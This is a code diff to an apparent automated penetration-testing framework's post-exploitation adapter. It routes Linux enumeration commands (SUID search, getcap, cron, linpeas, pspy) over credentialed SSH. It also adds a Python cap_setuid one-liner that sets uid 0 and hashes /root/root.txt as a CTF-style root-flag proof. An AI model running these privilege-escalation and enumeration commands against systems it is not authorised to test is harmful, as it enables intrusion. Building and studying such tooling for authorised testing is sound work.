@@ -16,6 +16,7 @@ and record cleanup records for partially failed uploads.
 
 from __future__ import annotations
 
+import json
 import re
 from typing import ClassVar
 from uuid import uuid4
@@ -31,6 +32,7 @@ from ariadne.adapters.base import (
     Runtime,
     ToolProbe,
 )
+from ariadne.adapters.ssh_support import ssh_process_spec
 from ariadne.core.errors import AdapterPolicyError
 from ariadne.core.observations import Observation
 
@@ -45,6 +47,7 @@ _LINUX_OPERATIONS: frozenset = frozenset({
     "services",
     "linpeas",
     "pspy_bounded",
+    "capability_python_proof",
 })
 
 _WINDOWS_OPERATIONS: frozenset = frozenset({
@@ -66,6 +69,18 @@ _PAYLOAD_UPLOAD_CAP = "exploit.payload_upload"
 
 # Environment variable prefix for capability keys.
 _CAPABILITY_ENV_PREFIX = "CAPABILITY_"
+
+
+def python_capability_proof_command(interpreter: str) -> str:
+    """Return the single curated cap_setuid proof command."""
+    return (
+        f"{interpreter} -c 'import hashlib,json,os,pathlib;"
+        "os.setuid(0);p=pathlib.Path(\"/root/root.txt\");"
+        "h=hashlib.sha256(p.read_bytes().strip()).hexdigest() "
+        "if p.is_file() else \"\";"
+        "print(json.dumps({\"euid\":os.geteuid(),"
+        "\"root_flag_sha256\":h}))'"
+    )
 
 # ── Curated binary metadata ──────────────────────────────────────────────────
 # Upstream release URL, version, SHA-256, license, architecture, and local
@@ -253,6 +268,7 @@ class PostExAdapter:
             "services": self._plan_linux_services,
             "linpeas": self._plan_linux_linpeas,
             "pspy_bounded": self._plan_linux_pspy,
+            "capability_python_proof": self._plan_linux_capability_python_proof,
         }
         fn = planner.get(op)
         if fn is None:
@@ -264,6 +280,14 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command="id",
+                timeout_seconds=30,
+                max_output_bytes=64 * 1024,
+            )
         return ProcessSpec(
             argv=("ssh", str(context.target.host), "id"),
             timeout_seconds=30,
@@ -275,6 +299,14 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command="sudo -l -n",
+                timeout_seconds=30,
+                max_output_bytes=256 * 1024,
+            )
         return ProcessSpec(
             argv=("ssh", str(context.target.host), "sudo -l -n"),
             timeout_seconds=30,
@@ -286,12 +318,23 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        remote_command = (
+            "find / -type f \\( -perm -4000 -o -perm -2000 \\) "
+            "-exec ls -la {} \\; 2>/dev/null"
+        )
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command=remote_command,
+                timeout_seconds=60,
+                max_output_bytes=1 * 1024 * 1024,
+            )
         return ProcessSpec(
             argv=(
                 "ssh",
                 str(context.target.host),
-                "find / -type f \\( -perm -4000 -o -perm -2000 \\) "
-                "-exec ls -la {} \\; 2>/dev/null",
+                remote_command,
             ),
             timeout_seconds=60,
             max_output_bytes=1 * 1024 * 1024,
@@ -302,11 +345,20 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        remote_command = "getcap -r / 2>/dev/null || echo 'getcap not available'"
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command=remote_command,
+                timeout_seconds=60,
+                max_output_bytes=512 * 1024,
+            )
         return ProcessSpec(
             argv=(
                 "ssh",
                 str(context.target.host),
-                "getcap -r / 2>/dev/null || echo 'getcap not available'",
+                remote_command,
             ),
             timeout_seconds=60,
             max_output_bytes=512 * 1024,
@@ -317,13 +369,24 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        remote_command = (
+            "cat /etc/crontab 2>/dev/null; "
+            "ls -la /etc/cron.d/ 2>/dev/null; "
+            "systemctl list-timers --all 2>/dev/null || true"
+        )
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command=remote_command,
+                timeout_seconds=60,
+                max_output_bytes=512 * 1024,
+            )
         return ProcessSpec(
             argv=(
                 "ssh",
                 str(context.target.host),
-                "cat /etc/crontab 2>/dev/null; "
-                "ls -la /etc/cron.d/ 2>/dev/null; "
-                "systemctl list-timers --all 2>/dev/null || true",
+                remote_command,
             ),
             timeout_seconds=60,
             max_output_bytes=512 * 1024,
@@ -334,12 +397,23 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        remote_command = (
+            "systemctl list-units --type=service --all 2>/dev/null || "
+            "service --status-all 2>/dev/null || echo 'no service manager'"
+        )
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command=remote_command,
+                timeout_seconds=60,
+                max_output_bytes=1 * 1024 * 1024,
+            )
         return ProcessSpec(
             argv=(
                 "ssh",
                 str(context.target.host),
-                "systemctl list-units --type=service --all 2>/dev/null || "
-                "service --status-all 2>/dev/null || echo 'no service manager'",
+                remote_command,
             ),
             timeout_seconds=60,
             max_output_bytes=1 * 1024 * 1024,
@@ -350,11 +424,22 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        remote_command = (
+            "bash /opt/tools/linpeas.sh 2>/dev/null || echo 'linpeas not found'"
+        )
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command=remote_command,
+                timeout_seconds=600,
+                max_output_bytes=5 * 1024 * 1024,
+            )
         return ProcessSpec(
             argv=(
                 "ssh",
                 str(context.target.host),
-                "bash /opt/tools/linpeas.sh 2>/dev/null || echo 'linpeas not found'",
+                remote_command,
             ),
             timeout_seconds=600,
             max_output_bytes=5 * 1024 * 1024,
@@ -365,14 +450,51 @@ class PostExAdapter:
         inputs: dict[str, object],
         context: AdapterContext,
     ) -> ProcessSpec:
+        remote_command = (
+            "timeout 60 /opt/tools/pspy64 2>/dev/null || echo 'pspy not found'"
+        )
+        if inputs.get("credential_ref"):
+            return ssh_process_spec(
+                inputs=inputs,
+                context=context,
+                remote_command=remote_command,
+                timeout_seconds=90,
+                max_output_bytes=2 * 1024 * 1024,
+            )
         return ProcessSpec(
             argv=(
                 "ssh",
                 str(context.target.host),
-                "timeout 60 /opt/tools/pspy64 2>/dev/null || echo 'pspy not found'",
+                remote_command,
             ),
             timeout_seconds=90,
             max_output_bytes=2 * 1024 * 1024,
+        )
+
+    def _plan_linux_capability_python_proof(
+        self,
+        inputs: dict[str, object],
+        context: AdapterContext,
+    ) -> ProcessSpec:
+        interpreter = inputs.get("interpreter")
+        if (
+            not isinstance(interpreter, str)
+            or re.fullmatch(
+                r"/(?:usr/(?:local/)?)?bin/python(?:3(?:\.\d+)?)?",
+                interpreter,
+            )
+            is None
+        ):
+            raise AdapterError(
+                "interpreter must be an observed absolute Python executable"
+            )
+        remote_command = python_capability_proof_command(interpreter)
+        return ssh_process_spec(
+            inputs=inputs,
+            context=context,
+            remote_command=remote_command,
+            timeout_seconds=30,
+            max_output_bytes=64 * 1024,
         )
 
     # ── Windows planners ───────────────────────────────────────────────────
@@ -558,6 +680,28 @@ class PostExAdapter:
             return ()
 
         observations: list[Observation] = []
+
+        try:
+            structured = json.loads(stdout.strip())
+        except json.JSONDecodeError:
+            structured = None
+        if (
+            isinstance(structured, dict)
+            and structured.get("euid") == 0
+            and isinstance(structured.get("root_flag_sha256"), str)
+            and re.fullmatch(r"[0-9a-f]{64}", structured["root_flag_sha256"])
+        ):
+            observations.append(self._make_observation({
+                "tool": "python_cap_setuid",
+                "type": "privesc_path_identified",
+                "euid": 0,
+                "objective_proof": {
+                    "kind": "root_flag",
+                    "description": "Target-local root objective was readable",
+                    "proof": structured["root_flag_sha256"],
+                },
+            }))
+            return tuple(observations)
 
         # Detect LinPEAS output
         if "PEASS-ng" in stdout and "SUID" in stdout:
